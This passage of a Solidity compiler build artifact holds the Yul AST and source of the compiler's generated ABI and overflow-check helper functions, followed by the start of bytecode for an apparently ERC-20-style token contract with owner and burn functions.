ariableNames":[{"name":"value0","nativeSrc":"5806:6:10","nodeType":"YulIdentifier","src":"5806:6:10"}]}]},{"nativeSrc":"5889:118:10","nodeType":"YulBlock","src":"5889:118:10","statements":[{"nativeSrc":"5904:16:10","nodeType":"YulVariableDeclaration","src":"5904:16:10","value":{"kind":"number","nativeSrc":"5918:2:10","nodeType":"YulLiteral","src":"5918:2:10","type":"","value":"32"},"variables":[{"name":"offset","nativeSrc":"5908:6:10","nodeType":"YulTypedName","src":"5908:6:10","type":""}]},{"nativeSrc":"5934:63:10","nodeType":"YulAssignment","src":"5934:63:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"5969:9:10","nodeType":"YulIdentifier","src":"5969:9:10"},{"name":"offset","nativeSrc":"5980:6:10","nodeType":"YulIdentifier","src":"5980:6:10"}],"functionName":{"name":"add","nativeSrc":"5965:3:10","nodeType":"YulIdentifier","src":"5965:3:10"},"nativeSrc":"5965:22:10","nodeType":"YulFunctionCall","src":"5965:22:10"},{"name":"dataEnd","nativeSrc":"5989:7:10","nodeType":"YulIdentifier","src":"5989:7:10"}],"functionName":{"name":"abi_decode_t_address","nativeSrc":"5944:20:10","nodeType":"YulIdentifier","src":"5944:20:10"},"nativeSrc":"5944:53:10","nodeType":"YulFunctionCall","src":"5944:53:10"},"variableNames":[{"name":"value1","nativeSrc":"5934:6:10","nodeType":"YulIdentifier","src":"5934:6:10"}]}]}]},"name":"abi_decode_tuple_t_addresst_address","nativeSrc":"5540:474:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"5585:9:10","nodeType":"YulTypedName","src":"5585:9:10","type":""},{"name":"dataEnd","nativeSrc":"5596:7:10","nodeType":"YulTypedName","src":"5596:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"5608:6:10","nodeType":"YulTypedName","src":"5608:6:10","type":""},{"name":"value1","nativeSrc":"5616:6:10","nodeType":"YulTypedName","src":"5616:6:10","type":""}],"src":"5540:474:10"},{"body":{"nativeSrc":"6048:152:10","nodeType":"YulBlock","src":"6048:152:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"6065:1:10","nodeType":"YulLiteral","src":"6065:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"6068:77:10","nodeType":"YulLiteral","src":"6068:77:10","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"6058:6:10","nodeType":"YulIdentifier","src":"6058:6:10"},"nativeSrc":"6058:88:10","nodeType":"YulFunctionCall","src":"6058:88:10"},"nativeSrc":"6058:88:10","nodeType":"YulExpressionStatement","src":"6058:88:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"6162:1:10","nodeType":"YulLiteral","src":"6162:1:10","type":"","value":"4"},{"kind":"number","nativeSrc":"6165:4:10","nodeType":"YulLiteral","src":"6165:4:10","type":"","value":"0x22"}],"functionName":{"name":"mstore","nativeSrc":"6155:6:10","nodeType":"YulIdentifier","src":"6155:6:10"},"nativeSrc":"6155:15:10","nodeType":"YulFunctionCall","src":"6155:15:10"},"nativeSrc":"6155:15:10","nodeType":"YulExpressionStatement","src":"6155:15:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"6186:1:10","nodeType":"YulLiteral","src":"6186:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"6189:4:10","nodeType":"YulLiteral","src":"6189:4:10","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"6179:6:10","nodeType":"YulIdentifier","src":"6179:6:10"},"nativeSrc":"6179:15:10","nodeType":"YulFunctionCall","src":"6179:15:10"},"nativeSrc":"6179:15:10","nodeType":"YulExpressionStatement","src":"6179:15:10"}]},"name":"panic_error_0x22","nativeSrc":"6020:180:10","nodeType":"YulFunctionDefinition","src":"6020:180:10"},{"body":{"nativeSrc":"6257:269:10","nodeType":"YulBlock","src":"6257:269:10","statements":[{"nativeSrc":"6267:22:10","nodeType":"YulAssignment","src":"6267:22:10","value":{"arguments":[{"name":"data","nativeSrc":"6281:4:10","nodeType":"YulIdentifier","src":"6281:4:10"},{"kind":"number","nativeSrc":"6287:1:10","nodeType":"YulLiteral","src":"6287:1:10","type":"","value":"2"}],"functionName":{"name":"div","nativeSrc":"6277:3:10","nodeType":"YulIdentifier","src":"6277:3:10"},"nativeSrc":"6277:12:10","nodeType":"YulFunctionCall","src":"6277:12:10"},"variableNames":[{"name":"length","nativeSrc":"6267:6:10","nodeType":"YulIdentifier","src":"6267:6:10"}]},{"nativeSrc":"6298:38:10","nodeType":"YulVariableDeclaration","src":"6298:38:10","value":{"arguments":[{"name":"data","nativeSrc":"6328:4:10","nodeType":"YulIdentifier","src":"6328:4:10"},{"kind":"number","nativeSrc":"6334:1:10","nodeType":"YulLiteral","src":"6334:1:10","type":"","value":"1"}],"functionName":{"name":"and","nativeSrc":"6324:3:10","nodeType":"YulIdentifier","src":"6324:3:10"},"nativeSrc":"6324:12:10","nodeType":"YulFunctionCall","src":"6324:12:10"},"variables":[{"name":"outOfPlaceEncoding","nativeSrc":"6302:18:10","nodeType":"YulTypedName","src":"6302:18:10","type":""}]},{"body":{"nativeSrc":"6375:51:10","nodeType":"YulBlock","src":"6375:51:10","statements":[{"nativeSrc":"6389:27:10","nodeType":"YulAssignment","src":"6389:27:10","value":{"arguments":[{"name":"length","nativeSrc":"6403:6:10","nodeType":"YulIdentifier","src":"6403:6:10"},{"kind":"number","nativeSrc":"6411:4:10","nodeType":"YulLiteral","src":"6411:4:10","type":"","value":"0x7f"}],"functionName":{"name":"and","nativeSrc":"6399:3:10","nodeType":"YulIdentifier","src":"6399:3:10"},"nativeSrc":"6399:17:10","nodeType":"YulFunctionCall","src":"6399:17:10"},"variableNames":[{"name":"length","nativeSrc":"6389:6:10","nodeType":"YulIdentifier","src":"6389:6:10"}]}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nativeSrc":"6355:18:10","nodeType":"YulIdentifier","src":"6355:18:10"}],"functionName":{"name":"iszero","nativeSrc":"6348:6:10","nodeType":"YulIdentifier","src":"6348:6:10"},"nativeSrc":"6348:26:10","nodeType":"YulFunctionCall","src":"6348:26:10"},"nativeSrc":"6345:81:10","nodeType":"YulIf","src":"6345:81:10"},{"body":{"nativeSrc":"6478:42:10","nodeType":"YulBlock","src":"6478:42:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x22","nativeSrc":"6492:16:10","nodeType":"YulIdentifier","src":"6492:16:10"},"nativeSrc":"6492:18:10","nodeType":"YulFunctionCall","src":"6492:18:10"},"nativeSrc":"6492:18:10","nodeType":"YulExpressionStatement","src":"6492:18:10"}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nativeSrc":"6442:18:10","nodeType":"YulIdentifier","src":"6442:18:10"},{"arguments":[{"name":"length","nativeSrc":"6465:6:10","nodeType":"YulIdentifier","src":"6465:6:10"},{"kind":"number","nativeSrc":"6473:2:10","nodeType":"YulLiteral","src":"6473:2:10","type":"","value":"32"}],"functionName":{"name":"lt","nativeSrc":"6462:2:10","nodeType":"YulIdentifier","src":"6462:2:10"},"nativeSrc":"6462:14:10","nodeType":"YulFunctionCall","src":"6462:14:10"}],"functionName":{"name":"eq","nativeSrc":"6439:2:10","nodeType":"YulIdentifier","src":"6439:2:10"},"nativeSrc":"6439:38:10","nodeType":"YulFunctionCall","src":"6439:38:10"},"nativeSrc":"6436:84:10","nodeType":"YulIf","src":"6436:84:10"}]},"name":"extract_byte_array_length","nativeSrc":"6206:320:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nativeSrc":"6241:4:10","nodeType":"YulTypedName","src":"6241:4:10","type":""}],"returnVariables":[{"name":"length","nativeSrc":"6250:6:10","nodeType":"YulTypedName","src":"6250:6:10","type":""}],"src":"6206:320:10"},{"body":{"nativeSrc":"6560:152:10","nodeType":"YulBlock","src":"6560:152:10","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"6577:1:10","nodeType":"YulLiteral","src":"6577:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"6580:77:10","nodeType":"YulLiteral","src":"6580:77:10","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"6570:6:10","nodeType":"YulIdentifier","src":"6570:6:10"},"nativeSrc":"6570:88:10","nodeType":"YulFunctionCall","src":"6570:88:10"},"nativeSrc":"6570:88:10","nodeType":"YulExpressionStatement","src":"6570:88:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"6674:1:10","nodeType":"YulLiteral","src":"6674:1:10","type":"","value":"4"},{"kind":"number","nativeSrc":"6677:4:10","nodeType":"YulLiteral","src":"6677:4:10","type":"","value":"0x11"}],"functionName":{"name":"mstore","nativeSrc":"6667:6:10","nodeType":"YulIdentifier","src":"6667:6:10"},"nativeSrc":"6667:15:10","nodeType":"YulFunctionCall","src":"6667:15:10"},"nativeSrc":"6667:15:10","nodeType":"YulExpressionStatement","src":"6667:15:10"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"6698:1:10","nodeType":"YulLiteral","src":"6698:1:10","type":"","value":"0"},{"kind":"number","nativeSrc":"6701:4:10","nodeType":"YulLiteral","src":"6701:4:10","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"6691:6:10","nodeType":"YulIdentifier","src":"6691:6:10"},"nativeSrc":"6691:15:10","nodeType":"YulFunctionCall","src":"6691:15:10"},"nativeSrc":"6691:15:10","nodeType":"YulExpressionStatement","src":"6691:15:10"}]},"name":"panic_error_0x11","nativeSrc":"6532:180:10","nodeType":"YulFunctionDefinition","src":"6532:180:10"},{"body":{"nativeSrc":"6766:362:10","nodeType":"YulBlock","src":"6766:362:10","statements":[{"nativeSrc":"6776:25:10","nodeType":"YulAssignment","src":"6776:25:10","value":{"arguments":[{"name":"x","nativeSrc":"6799:1:10","nodeType":"YulIdentifier","src":"6799:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"6781:17:10","nodeType":"YulIdentifier","src":"6781:17:10"},"nativeSrc":"6781:20:10","nodeType":"YulFunctionCall","src":"6781:20:10"},"variableNames":[{"name":"x","nativeSrc":"6776:1:10","nodeType":"YulIdentifier","src":"6776:1:10"}]},{"nativeSrc":"6810:25:10","nodeType":"YulAssignment","src":"6810:25:10","value":{"arguments":[{"name":"y","nativeSrc":"6833:1:10","nodeType":"YulIdentifier","src":"6833:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"6815:17:10","nodeType":"YulIdentifier","src":"6815:17:10"},"nativeSrc":"6815:20:10","nodeType":"YulFunctionCall","src":"6815:20:10"},"variableNames":[{"name":"y","nativeSrc":"6810:1:10","nodeType":"YulIdentifier","src":"6810:1:10"}]},{"nativeSrc":"6844:28:10","nodeType":"YulVariableDeclaration","src":"6844:28:10","value":{"arguments":[{"name":"x","nativeSrc":"6867:1:10","nodeType":"YulIdentifier","src":"6867:1:10"},{"name":"y","nativeSrc":"6870:1:10","nodeType":"YulIdentifier","src":"6870:1:10"}],"functionName":{"name":"mul","nativeSrc":"6863:3:10","nodeType":"YulIdentifier","src":"6863:3:10"},"nativeSrc":"6863:9:10","nodeType":"YulFunctionCall","src":"6863:9:10"},"variables":[{"name":"product_raw","nativeSrc":"6848:11:10","nodeType":"YulTypedName","src":"6848:11:10","type":""}]},{"nativeSrc":"6881:41:10","nodeType":"YulAssignment","src":"6881:41:10","value":{"arguments":[{"name":"product_raw","nativeSrc":"6910:11:10","nodeType":"YulIdentifier","src":"6910:11:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"6892:17:10","nodeType":"YulIdentifier","src":"6892:17:10"},"nativeSrc":"6892:30:10","nodeType":"YulFunctionCall","src":"6892:30:10"},"variableNames":[{"name":"product","nativeSrc":"6881:7:10","nodeType":"YulIdentifier","src":"6881:7:10"}]},{"body":{"nativeSrc":"7099:22:10","nodeType":"YulBlock","src":"7099:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"7101:16:10","nodeType":"YulIdentifier","src":"7101:16:10"},"nativeSrc":"7101:18:10","nodeType":"YulFunctionCall","src":"7101:18:10"},"nativeSrc":"7101:18:10","nodeType":"YulExpressionStatement","src":"7101:18:10"}]},"condition":{"arguments":[{"arguments":[{"arguments":[{"name":"x","nativeSrc":"7032:1:10","nodeType":"YulIdentifier","src":"7032:1:10"}],"functionName":{"name":"iszero","nativeSrc":"7025:6:10","nodeType":"YulIdentifier","src":"7025:6:10"},"nativeSrc":"7025:9:10","nodeType":"YulFunctionCall","src":"7025:9:10"},{"arguments":[{"name":"y","nativeSrc":"7055:1:10","nodeType":"YulIdentifier","src":"7055:1:10"},{"arguments":[{"name":"product","nativeSrc":"7062:7:10","nodeType":"YulIdentifier","src":"7062:7:10"},{"name":"x","nativeSrc":"7071:1:10","nodeType":"YulIdentifier","src":"7071:1:10"}],"functionName":{"name":"div","nativeSrc":"7058:3:10","nodeType":"YulIdentifier","src":"7058:3:10"},"nativeSrc":"7058:15:10","nodeType":"YulFunctionCall","src":"7058:15:10"}],"functionName":{"name":"eq","nativeSrc":"7052:2:10","nodeType":"YulIdentifier","src":"7052:2:10"},"nativeSrc":"7052:22:10","nodeType":"YulFunctionCall","src":"7052:22:10"}],"functionName":{"name":"or","nativeSrc":"7005:2:10","nodeType":"YulIdentifier","src":"7005:2:10"},"nativeSrc":"7005:83:10","nodeType":"YulFunctionCall","src":"7005:83:10"}],"functionName":{"name":"iszero","nativeSrc":"6985:6:10","nodeType":"YulIdentifier","src":"6985:6:10"},"nativeSrc":"6985:113:10","nodeType":"YulFunctionCall","src":"6985:113:10"},"nativeSrc":"6982:139:10","nodeType":"YulIf","src":"6982:139:10"}]},"name":"checked_mul_t_uint256","nativeSrc":"6718:410:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nativeSrc":"6749:1:10","nodeType":"YulTypedName","src":"6749:1:10","type":""},{"name":"y","nativeSrc":"6752:1:10","nodeType":"YulTypedName","src":"6752:1:10","type":""}],"returnVariables":[{"name":"product","nativeSrc":"6758:7:10","nodeType":"YulTypedName","src":"6758:7:10","type":""}],"src":"6718:410:10"},{"body":{"nativeSrc":"7288:288:10","nodeType":"YulBlock","src":"7288:288:10","statements":[{"nativeSrc":"7298:26:10","nodeType":"YulAssignment","src":"7298:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"7310:9:10","nodeType":"YulIdentifier","src":"7310:9:10"},{"kind":"number","nativeSrc":"7321:2:10","nodeType":"YulLiteral","src":"7321:2:10","type":"","value":"96"}],"functionName":{"name":"add","nativeSrc":"7306:3:10","nodeType":"YulIdentifier","src":"7306:3:10"},"nativeSrc":"7306:18:10","nodeType":"YulFunctionCall","src":"7306:18:10"},"variableNames":[{"name":"tail","nativeSrc":"7298:4:10","nodeType":"YulIdentifier","src":"7298:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"7378:6:10","nodeType":"YulIdentifier","src":"7378:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"7391:9:10","nodeType":"YulIdentifier","src":"7391:9:10"},{"kind":"number","nativeSrc":"7402:1:10","nodeType":"YulLiteral","src":"7402:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"7387:3:10","nodeType":"YulIdentifier","src":"7387:3:10"},"nativeSrc":"7387:17:10","nodeType":"YulFunctionCall","src":"7387:17:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"7334:43:10","nodeType":"YulIdentifier","src":"7334:43:10"},"nativeSrc":"7334:71:10","nodeType":"YulFunctionCall","src":"7334:71:10"},"nativeSrc":"7334:71:10","nodeType":"YulExpressionStatement","src":"7334:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"7459:6:10","nodeType":"YulIdentifier","src":"7459:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"7472:9:10","nodeType":"YulIdentifier","src":"7472:9:10"},{"kind":"number","nativeSrc":"7483:2:10","nodeType":"YulLiteral","src":"7483:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"7468:3:10","nodeType":"YulIdentifier","src":"7468:3:10"},"nativeSrc":"7468:18:10","nodeType":"YulFunctionCall","src":"7468:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"7415:43:10","nodeType":"YulIdentifier","src":"7415:43:10"},"nativeSrc":"7415:72:10","nodeType":"YulFunctionCall","src":"7415:72:10"},"nativeSrc":"7415:72:10","nodeType":"YulExpressionStatement","src":"7415:72:10"},{"expression":{"arguments":[{"name":"value2","nativeSrc":"7541:6:10","nodeType":"YulIdentifier","src":"7541:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"7554:9:10","nodeType":"YulIdentifier","src":"7554:9:10"},{"kind":"number","nativeSrc":"7565:2:10","nodeType":"YulLiteral","src":"7565:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"7550:3:10","nodeType":"YulIdentifier","src":"7550:3:10"},"nativeSrc":"7550:18:10","nodeType":"YulFunctionCall","src":"7550:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"7497:43:10","nodeType":"YulIdentifier","src":"7497:43:10"},"nativeSrc":"7497:72:10","nodeType":"YulFunctionCall","src":"7497:72:10"},"nativeSrc":"7497:72:10","nodeType":"YulExpressionStatement","src":"7497:72:10"}]},"name":"abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed","nativeSrc":"7134:442:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"7244:9:10","nodeType":"YulTypedName","src":"7244:9:10","type":""},{"name":"value2","nativeSrc":"7256:6:10","nodeType":"YulTypedName","src":"7256:6:10","type":""},{"name":"value1","nativeSrc":"7264:6:10","nodeType":"YulTypedName","src":"7264:6:10","type":""},{"name":"value0","nativeSrc":"7272:6:10","nodeType":"YulTypedName","src":"7272:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"7283:4:10","nodeType":"YulTypedName","src":"7283:4:10","type":""}],"src":"7134:442:10"},{"body":{"nativeSrc":"7626:147:10","nodeType":"YulBlock","src":"7626:147:10","statements":[{"nativeSrc":"7636:25:10","nodeType":"YulAssignment","src":"7636:25:10","value":{"arguments":[{"name":"x","nativeSrc":"7659:1:10","nodeType":"YulIdentifier","src":"7659:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"7641:17:10","nodeType":"YulIdentifier","src":"7641:17:10"},"nativeSrc":"7641:20:10","nodeType":"YulFunctionCall","src":"7641:20:10"},"variableNames":[{"name":"x","nativeSrc":"7636:1:10","nodeType":"YulIdentifier","src":"7636:1:10"}]},{"nativeSrc":"7670:25:10","nodeType":"YulAssignment","src":"7670:25:10","value":{"arguments":[{"name":"y","nativeSrc":"7693:1:10","nodeType":"YulIdentifier","src":"7693:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"7675:17:10","nodeType":"YulIdentifier","src":"7675:17:10"},"nativeSrc":"7675:20:10","nodeType":"YulFunctionCall","src":"7675:20:10"},"variableNames":[{"name":"y","nativeSrc":"7670:1:10","nodeType":"YulIdentifier","src":"7670:1:10"}]},{"nativeSrc":"7704:16:10","nodeType":"YulAssignment","src":"7704:16:10","value":{"arguments":[{"name":"x","nativeSrc":"7715:1:10","nodeType":"YulIdentifier","src":"7715:1:10"},{"name":"y","nativeSrc":"7718:1:10","nodeType":"YulIdentifier","src":"7718:1:10"}],"functionName":{"name":"add","nativeSrc":"7711:3:10","nodeType":"YulIdentifier","src":"7711:3:10"},"nativeSrc":"7711:9:10","nodeType":"YulFunctionCall","src":"7711:9:10"},"variableNames":[{"name":"sum","nativeSrc":"7704:3:10","nodeType":"YulIdentifier","src":"7704:3:10"}]},{"body":{"nativeSrc":"7744:22:10","nodeType":"YulBlock","src":"7744:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"7746:16:10","nodeType":"YulIdentifier","src":"7746:16:10"},"nativeSrc":"7746:18:10","nodeType":"YulFunctionCall","src":"7746:18:10"},"nativeSrc":"7746:18:10","nodeType":"YulExpressionStatement","src":"7746:18:10"}]},"condition":{"arguments":[{"name":"x","nativeSrc":"7736:1:10","nodeType":"YulIdentifier","src":"7736:1:10"},{"name":"sum","nativeSrc":"7739:3:10","nodeType":"YulIdentifier","src":"7739:3:10"}],"functionName":{"name":"gt","nativeSrc":"7733:2:10","nodeType":"YulIdentifier","src":"7733:2:10"},"nativeSrc":"7733:10:10","nodeType":"YulFunctionCall","src":"7733:10:10"},"nativeSrc":"7730:36:10","nodeType":"YulIf","src":"7730:36:10"}]},"name":"checked_add_t_uint256","nativeSrc":"7582:191:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nativeSrc":"7613:1:10","nodeType":"YulTypedName","src":"7613:1:10","type":""},{"name":"y","nativeSrc":"7616:1:10","nodeType":"YulTypedName","src":"7616:1:10","type":""}],"returnVariables":[{"name":"sum","nativeSrc":"7622:3:10","nodeType":"YulTypedName","src":"7622:3:10","type":""}],"src":"7582:191:10"}]},"contents":"{\n\n    function array_length_t_string_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length) -> updated_pos {\n        mstore(pos, length)\n        updated_pos := add(pos, 0x20)\n    }\n\n    function copy_memory_to_memory_with_cleanup(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        mstore(add(dst, length), 0)\n    }\n\n    function round_up_to_mul_of_32(value) -> result {\n        result := and(add(value, 31), not(31))\n    }\n\n    function abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value, pos) -> end {\n        let length := array_length_t_string_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_string_memory_ptr_fromStack(pos, length)\n        copy_memory_to_memory_with_cleanup(add(value, 0x20), pos, length)\n        end := add(pos, round_up_to_mul_of_32(length))\n    }\n\n    function abi_encode_tuple_t_string_memory_ptr__to_t_string_memory_ptr__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        mstore(add(headStart, 0), sub(tail, headStart))\n        tail := abi_encode_t_string_memory_ptr_to_t_string_memory_ptr_fromStack(value0,  tail)\n\n    }\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function validator_revert_t_uint256(value) {\n        if iszero(eq(value, cleanup_t_uint256(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_uint256(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_uint256(value)\n    }\n\n    function abi_decode_tuple_t_addresst_uint256(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_decode_tuple_t_addresst_addresst_uint256(headStart, dataEnd) -> value0, value1, value2 {\n        if slt(sub(dataEnd, headStart), 96) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 64\n\n            value2 := abi_decode_t_uint256(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function cleanup_t_uint8(value) -> cleaned {\n        cleaned := and(value, 0xff)\n    }\n\n    function abi_encode_t_uint8_to_t_uint8_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint8(value))\n    }\n\n    function abi_encode_tuple_t_uint8__to_t_uint8__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint8_to_t_uint8_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_decode_tuple_t_address(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function abi_decode_tuple_t_addresst_address(headStart, dataEnd) -> value0, value1 {\n        if slt(sub(dataEnd, headStart), 64) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n        {\n\n            let offset := 32\n\n            value1 := abi_decode_t_address(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function panic_error_0x22() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x22)\n        revert(0, 0x24)\n    }\n\n    function extract_byte_array_length(data) -> length {\n        length := div(data, 2)\n        let outOfPlaceEncoding := and(data, 1)\n        if iszero(outOfPlaceEncoding) {\n            length := and(length, 0x7f)\n        }\n\n        if eq(outOfPlaceEncoding, lt(length, 32)) {\n            panic_error_0x22()\n        }\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function checked_mul_t_uint256(x, y) -> product {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        let product_raw := mul(x, y)\n        product := cleanup_t_uint256(product_raw)\n\n        // overflow, if x != 0 and y != product/x\n        if iszero(\n            or(\n                iszero(x),\n                eq(y, div(product, x))\n            )\n        ) { panic_error_0x11() }\n\n    }\n\n    function abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed(headStart , value2, value1, value0) -> tail {\n        tail := add(headStart, 96)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value2,  add(headStart, 64))\n\n    }\n\n    function checked_add_t_uint256(x, y) -> sum {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        sum := add(x, y)\n\n        if gt(x, sum) { panic_error_0x11() }\n\n    }\n\n}\n","id":10,"language":"Yul","name":"#utility.yul"}],"immutableReferences":{},"linkReferences":{},"object":"608060405234801561001057600080fd5b50600436106100cf5760003560e01c8063715018a61161008c5780639dc29fac116100665780639dc29fac14610204578063a9059cbb14610220578063dd62ed3e14610250578063f2fde38b14610280576100cf565b8063715018a6146101be5780638da5cb5b146101c857806395d89b41146101e6576100cf565b806306fdde03146100d4578063095ea7b3146100f257806318160ddd1461012257806323b872dd14610140578063313ce5671461017057806370a082311461018e575b600080fd5b6100dc61029c565b6040516100e99190610e01565b60405180910390f35b61010c60048036038101906101079190610ebc565b61032e565b6040516101199190610f17565b60405180910390f35b61012a610351565b6040516101379190610f41565b60405180910390f35b61015a60048036038101906101559190610f5c565b61035b565b6040516101679190610f17565b60405180910390f35b61017861038a565b6040516101859190610fcb565b60405180910390f35b6101a860048036038101906101a39190610fe6565b610393565b6040516101b59190610f41565b60405180910390f35b6101c66103db565b005b6101d06103ef565b6040516101dd9190611022565b60405180910390f35b6101ee610419565b6040516101fb9190610e01565b60405180910390f35b61021e6004803